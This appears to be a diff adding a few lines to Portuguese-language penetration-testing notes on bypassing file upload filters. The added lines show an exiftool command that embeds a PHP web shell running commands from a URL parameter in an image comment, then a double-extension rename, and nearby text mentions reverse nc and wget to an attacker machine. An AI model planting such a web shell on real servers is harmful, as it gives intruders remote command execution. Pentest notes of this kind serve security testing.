@@ -4219,6 +4219,12 @@ Tentar as técnicas aprendidas acima, como alterar o head para `GIF89a` ou a ext
 
 e ver o comportamento da aplicação. Se positivo, pode se testar um wget na máquina do atacante ou ping ou nc reverso como no exemplo.
 
+Outra tentativa seria inserir um código php no comentário da imagem:
+
+	exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
+	mv file.jpg file.php.jpg
+
+
 - PHP Wrappers
 
 São funcionalidades/parâmetros do PHP mais atual, onde pode ser usado para obter acesso aos arquivos do server nos campos de input.
